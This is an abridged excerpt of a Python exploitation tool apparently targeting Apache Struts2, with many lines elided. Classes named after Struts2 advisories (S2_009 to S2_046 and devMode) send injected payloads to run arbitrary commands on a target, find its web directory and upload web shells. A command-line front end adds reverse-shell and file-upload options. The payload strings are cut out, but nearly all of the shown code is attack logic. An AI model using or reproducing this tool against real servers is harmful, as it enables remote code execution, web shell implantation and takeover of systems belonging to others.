...
def get_stream(url, headers=None, encoding="UTF-8"):
    ...
    try:
        lines = requests.get(
            url, headers=headers, timeout=_tiemout, stream=True, proxies=proxies
        )
        html = list()
...
def encode_multipart(exp):
    ...
    data.append(
        'Content-Disposition: form-data; name="test"; filename="{exp}"'.format(exp=exp)
    )
...
class S2_009:
    ...
    def exec_cmd(self, cmd):
        ...
        html = get(
            self.url + "&{key}={payload}".format(key=self.data, payload=payload),
            self.headers,
            self.encoding,
        )
        return html
...
class S2_013:
    ...
    def get_path(self):
        """获取web目录"""
        html = get(
            self.url + "?x={payload}".format(payload=self.web_path),
            self.headers,
            self.encoding,
        )
        return html
    ...
    def exec_cmd(self, cmd):
        ...
        html = get(
            self.url
            + "?x={payload}".format(payload=self.exec_payload.format(cmd=quote(cmd))),
            self.headers,
            self.encoding,
        )
        return html
    ...
    def upload_shell(self, upload_path, shell_path):
        ...
        html = post(
            self.url + "?x={payload}".format(payload=self.upload_paylaod),
            data,
            self.headers,
            self.encoding,
        )
...
class S2_015:
    ...
    def exec_cmd(self, cmd):
        ...
        payload = self.exec_payload.format(cmd=quote(cmd))
        html = get(
            self.url + "{payload}.action".format(payload=payload),
            self.headers,
            self.encoding,
        )
        if html.startswith("ERROR:"):
...
class S2_016:
    ...
    def __init__(self, url, data=None, headers=None, encoding="UTF-8"):
        ...
        self.exec_dict = {
            "payload1": self.exec_cmd1,
            "payload2": self.exec_cmd2,
            "payload3": self.exec_cmd3,
        }
        if "Content-Type" not in self.headers:
            self.headers["Content-Type"] = "application/x-www-form-urlencoded"
    ...
    def exec_cmd1(self, cmd):
        ...
        cmd = parse_cmd(cmd)
        html = get(
            self.url + "?" + self.exec_payload1.format(cmd=quote(cmd)),
            self.headers,
            self.encoding,
        )
        return html
    ...
    def exec_cmd2(self, cmd):
        """执行命令"""
        html = get(
            self.url + "?" + self.exec_payload2.format(cmd=quote(cmd)),
            self.headers,
            self.encoding,
        )
        return html
    ...
    def exec_cmd3(self, cmd):
        ...
        html = get(
            self.url
            + "?"
            + self.exec_payload3.replace("CMD", quote(cmd)).replace(
    ...
    def upload_shell1(self, upload_path, shell_path):
        shell = read_file(shell_path, self.encoding)
        data = self.upload_payload1.replace("PATH", quote(upload_path)).replace(
            "SHELL", quote(shell)
        )
        html = post(self.url, data, self.headers, self.encoding)
        if html == "OK":
    ...
    def upload_shell2(self, upload_path, shell_path):
        ...
        html = post(
            self.url + "?" + self.upload_payload2.format(path=upload_path),
            data,
            self.headers,
            self.encoding,
        )
...
class S2_019:
    ...
    def get_path(self):
        ...
        html = get(
            self.url
            + "?debug=command&expression={payload}".format(
                payload=self.web_path.format(encoding=self.encoding)
            ),
            self.headers,
            self.encoding,
        )
...
class S2_032:
    ...
    def get_path(self):
        """获取web目录"""
        html = get(
            self.url + "?" + self.web_path.format(encoding=self.encoding),
            self.headers,
            self.encoding,
        )
        return html
...
class S2_046:
    ...
    def check(self):
        ...
        files = {
            "test": (
                self.check_poc.replace("ENCODING", self.encoding),
                b"x",
                "text/plain",
            )
        }
    ...
    def get_path(self):
        ...
        files = {
            "test": (
                self.web_path.replace("ENCODING", self.encoding),
                b"x",
                "text/plain",
            )
        }
    ...
    def exec_cmd(self, cmd):
        """执行命令"""
        paylaod = self.exec_payload.replace("CMD", cmd).replace(
            "ENCODING", self.encoding
        )
    ...
    def upload_shell(self, upload_path, shell_path):
        ...
        files = {
            "test": (
                self.upload_paylaod.replace("SHELL", quote(shell))
                .replace("PATH", upload_path)
...
class S2_devMode:
    ...
    def exec_cmd(self, cmd):
        """执行命令"""
        html = get_stream(
            self.url + self.exec_payload.format(cmd=quote(cmd)),
            self.headers,
            self.encoding,
        )
        return html
...
def scan_one(url, data=None, headers=None, encoding="UTF-8"):
    ...
    click.secho(
        "[*] ----------------results------------------".format(url=url), fg="green"
    )
    ...
    for r in results:
        if r.startswith("ERROR:"):
            click.secho(
                "[ERROR] {url} 访问出错: {error}".format(url=url, error=r[6:]), fg="red"
            )
        else:
...
@click.option(
    "-d", "--data", help="POST参数, 需要使用的payload使用{exp}填充, 如: name=test&passwd={exp}"
)
    ...
    if name and url:
        ...
        if reverse:
            if name in reverse_names:
                ...
                if ":" not in reverse:
                    click.secho(
                        "[ERROR] reverse反弹地址格式不对,正确格式为: 192.168.1.10:8080", fg="red"
                    )
        ...
        if upfile and uppath:
            if name in upload_names and check_file(upfile):
                ...
                if result is True:
                    ...
                    click.secho(
                        "[ERROR] 文件上传失败! {error}".format(error=result[6:]), fg="red"
                    )
                    exit(0)
                else:
                    click.secho(
